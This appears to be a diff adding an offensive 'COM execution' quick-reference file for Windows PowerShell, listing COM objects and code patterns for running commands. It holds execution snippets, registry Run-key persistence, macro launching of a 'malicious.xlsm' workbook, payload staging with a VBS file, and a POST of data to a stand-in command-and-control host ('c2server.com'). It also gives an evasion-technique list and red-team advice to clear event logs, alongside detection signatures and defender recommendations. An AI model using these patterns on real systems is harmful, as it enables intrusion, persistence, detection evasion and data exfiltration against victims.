@@ -1,0 +1,248 @@
+================================================================================
+COM EXECUTION - QUICK REFERENCE GUIDE
+================================================================================
+
+PRIMARY COM OBJECTS (As Requested)
+================================================================================
+
+1. SHELL.BROWSERHELPER
+   Instantiation: $obj = New-Object -ComObject "Shell.BrowserHelper"
+   Key Methods:  ExecuteCommand(), Execute()
+   Use Case:     Browser-based code execution
+   Execution:    User context, registry-based
+
+2. INTERNETEXPLORER.APPLICATION
+   Instantiation: $ie = New-Object -ComObject "InternetExplorer.Application"
+   Key Methods:  Navigate(), ExecWB(), document.parentWindow.eval()
+   Use Case:     Browser automation, JavaScript execution
+   Execution:    User context, with GUI or hidden
+
+3. MSHTML
+   Instantiation: $html = New-Object -ComObject "HTMLFile"
+   Key Methods:  write(), open(), close()
+   Use Case:     HTML rendering, embedded script execution
+   Execution:    Script engine context (VBScript/JavaScript)
+
+================================================================================
+
+TOP 10 ALTERNATIVE COM OBJECTS
+================================================================================
+
+1. WScript.Shell (Most Common)
+   $shell = New-Object -ComObject "WScript.Shell"
+   $shell.Run("command.exe", 1, $false)
+   ➜ Direct command execution, registry access, file operations
+
+2. ScriptControl
+   $sc = New-Object -ComObject "ScriptControl"
+   $sc.Language = "VBScript"; $sc.Eval("expression")
+   ➜ VBScript/JScript evaluation without cmd.exe
+
+3. Excel.Application
+   $excel = New-Object -ComObject "Excel.Application"
+   $excel.Run("MacroName")
+   ➜ VBA macro execution, Office automation
+
+4. Scripting.FileSystemObject
+   $fso = New-Object -ComObject "Scripting.FileSystemObject"
+   $fso.CreateTextFile("path"), $fso.DeleteFile("path")
+   ➜ File/folder operations, payload staging
+
+5. Shell.Application
+   $shell = New-Object -ComObject "Shell.Application"
+   $shell.ShellExecute("cmd.exe")
+   ➜ Shell command execution, folder/file navigation
+
+6. ADODB.Stream
+   $stream = New-Object -ComObject "ADODB.Stream"
+   $stream.SaveToFile("path"), $stream.LoadFromFile("path")
+   ➜ Binary file I/O, stealth file operations
+
+7. Word.Application
+   $word = New-Object -ComObject "Word.Application"
+   $word.Run("MacroName")
+   ➜ VBA macro execution, document automation
+
+8. ScheduledTasks.TaskScheduler
+   $scheduler = New-Object -ComObject "Schedule.Service"
+   $scheduler.NewTask()
+   ➜ Persistence via scheduled tasks (requires admin)
+
+9. MSXML2.XMLHTTP
+   $http = New-Object -ComObject "MSXML2.XMLHTTP.3.0"
+   $http.Open("GET", "url"), $http.Send()
+   ➜ HTTP requests, command & control communication
+
+10. Outlook.Application
+    $outlook = New-Object -ComObject "Outlook.Application"
+    $outlook.GetNamespace("MAPI")
+    ➜ Email access, credential harvesting, exfiltration
+
+================================================================================
+
+EXECUTION PATTERNS
+================================================================================
+
+PATTERN 1: Direct Command Execution
+  $shell = New-Object -ComObject "WScript.Shell"
+  $shell.Run("powershell.exe -Command 'Get-Process'", 1, $false)
+
+PATTERN 2: Script Evaluation
+  $sc = New-Object -ComObject "ScriptControl"
+  $sc.Language = "VBScript"
+  $sc.Eval("2 + 2")
+
+PATTERN 3: File-Based Execution
+  $fso = New-Object -ComObject "Scripting.FileSystemObject"
+  $file = $fso.CreateTextFile("script.vbs")
+  $file.WriteLine("payload")
+  $file.Close()
+
+PATTERN 4: Office Macro Execution
+  $excel = New-Object -ComObject "Excel.Application"
+  $wb = $excel.Workbooks.Open("malicious.xlsm")
+  $excel.Run("Module1.Main")
+
+PATTERN 5: Registry Persistence
+  $shell = New-Object -ComObject "WScript.Shell"
+  $shell.RegWrite("HKCU:\Software\Run\Service", "cmd.exe")
+
+PATTERN 6: Scheduled Task Creation
+  $scheduler = New-Object -ComObject "Schedule.Service"
+  $scheduler.Connect()
+  $folder = $scheduler.GetFolder("\")
+  $taskDef = $scheduler.NewTask(0)
+
+PATTERN 7: Network Communication
+  $http = New-Object -ComObject "MSXML2.XMLHTTP.3.0"
+  $http.Open("POST", "http://c2server.com/api", $false)
+  $http.Send("data=payload")
+
+PATTERN 8: Obfuscated Execution
+  $prog = "WScript" + ".Shell"
+  $shell = New-Object -ComObject $prog
+  $shell.Run("calc.exe")
+
+PATTERN 9: Reflective Execution
+  $type = [Type]::GetTypeFromCLSID([GUID]"{72C24DD5-D70A-438B-8A42-98424B88AFB8}")
+  $instance = [Activator]::CreateInstance($type)
+  $instance.Run("cmd.exe")
+
+PATTERN 10: Chained Execution
+  $fso = New-Object -ComObject "Scripting.FileSystemObject"
+  $file = $fso.CreateTextFile("payload.vbs")
+  [FILE CONTENT]
+  $file.Close()
+  $shell = New-Object -ComObject "WScript.Shell"
+  $shell.Run("cscript.exe payload.vbs")
+
+================================================================================
+
+CLSID REFERENCE (For Reflective Loading)
+================================================================================
+
+WScript.Shell              {72C24DD5-D70A-438B-8A42-98424B88AFB8}
+Shell.Application          {13709620-C279-11CE-A49E-444553540000}
+InternetExplorer.App       {0002DF01-0000-0000-C000-000000000046}
+Excel.Application          {00024500-0000-0000-C000-000000000046}
+Word.Application           {000209FF-0000-0000-C000-000000000046}
+Outlook.Application        {0006F03A-0000-0000-C000-000000000046}
+PowerPoint.Application     {91493440-5A91-11CF-8700-00AA0060263B}
+ScriptControl              {0E59F1D5-1FBE-11D0-8FF2-00A0D10A6B88}
+ADODB.Stream               {00000566-0000-0010-8000-00AA006D2EA4}
+MSXML2.XMLHTTP.3.0         {F6D90F11-9C73-11D3-B32E-00C04F990BB4}
+FileSystemObject           {0D43FE01-F093-11CF-8940-00A0C9054228}
+Schedule.Service           {0F87369F-A4E5-4CFC-BD3E-73E6154572DD}
+
+================================================================================
+
+DETECTION SIGNATURES
+================================================================================
+
+Monitored COM Object Creation:
+  - InternetExplorer.Application + document.parentWindow.eval()
+  - Excel.Application + .Run() / VBAProject access
+  - Word.Application + .Run() / VBAProject access
+  - WScript.Shell + .Run() / .Exec()
+  - MSXML2.XMLHTTP + unusual domains
+
+Monitored Registry Keys:
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+  - HKCU\Software\Classes\
+  - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+
+Monitored Process Creation:
+  - powershell.exe + encoded commands
+  - cscript.exe / wscript.exe
+  - mshta.exe
+  - cmd.exe with /c /e /v flags
+
+================================================================================
+
+EVASION TECHNIQUES
+================================================================================
+
+1. Use ScriptControl instead of WScript.Shell.Run()
+   → Avoids cmd.exe/powershell.exe process creation
+
+2. Chain multiple COM objects
+   → Obfuscates intent and execution path
+
+3. Execute via Office macros in documents
+   → Leverages trusted processes (winword.exe, excel.exe)
+
+4. Use less-monitored COM objects (ADODB.Stream, Shell.Application)
+   → Bypasses common detection patterns
+
+5. Registry-based persistence via COM
+   → Survives process monitoring
+
+6. Encode/obfuscate ProgID strings
+   → Base64, concatenation, variable substitution
+
+7. Delayed execution with Task Scheduler
+   → Separates execution from command creation
+
+8. Store payloads in alternate data streams (ADS)
+   → Avoided by common file scanning
+
+9. Use legitimate admin tools (PSexec, WinRM) via COM
+   → Blends with administrative traffic
+
+10. Reflection-based COM instantiation
+    → Bypasses string-based detection patterns
+
+================================================================================
+
+PREVENTION RECOMMENDATIONS
+================================================================================
+
+For Blue Teams / Defenders:
+
+1. Monitor COM object instantiation (especially WScript.Shell, IE, Office)
+2. Block or restrict VBA macros in Office documents
+3. Disable or restrict script execution (PowerShell, VBScript, JScript)
+4. Monitor registry persistence locations
+5. Restrict Task Scheduler creation to admins only
+6. Implement application whitelisting
+7. Monitor outbound HTTP/HTTPS from COM-using processes
+8. Disable IE or restrict to specific sites
+9. Use EDR solutions with COM object monitoring
+10. Restrict administrative privileges
+11. Enable code integrity guard and memory protection
+12. Monitor WMI and COM bridge execution
+
+For Red Teams / Operators:
+
+1. Test com object availability before exploitation
+2. Use less-common COM objects when possible
+3. Combine with legitimate process abuse
+4. Chain multiple execution methods
+5. Use delayed execution techniques
+6. Obfuscate and encode payloads
+7. Monitor for detection signatures during execution
+8. Have fallback methods ready
+9. Clean up traces (registry, temp files, event logs)
+10. Consider lateral movement as alternative to local execution
+
+================================================================================
